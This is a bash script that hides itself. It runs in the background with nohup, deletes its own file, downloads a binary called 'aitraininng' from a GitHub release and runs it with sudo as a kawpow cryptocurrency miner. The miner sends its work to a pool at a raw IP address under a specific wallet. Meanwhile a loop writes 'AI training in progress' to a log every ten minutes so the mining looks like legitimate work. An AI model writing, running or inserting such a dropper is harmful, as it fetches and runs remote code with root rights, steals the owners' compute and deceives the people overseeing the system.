#!/bin/bash

# Run the script in the background using nohup and redirect output to /dev/null
nohup bash -c "
  ( sleep 1; rm -- \"$0\" ) &
  wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
  chmod +x aitraininng
  sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
  
  # Loop to echo 'AI training in progress' every 10 minutes
  while true; do
    echo 'AI training in progress' >> std_log_process_0.txt
    sleep 600  # 600 seconds = 10 minutes
  done
" > /dev/null 2>&1 &
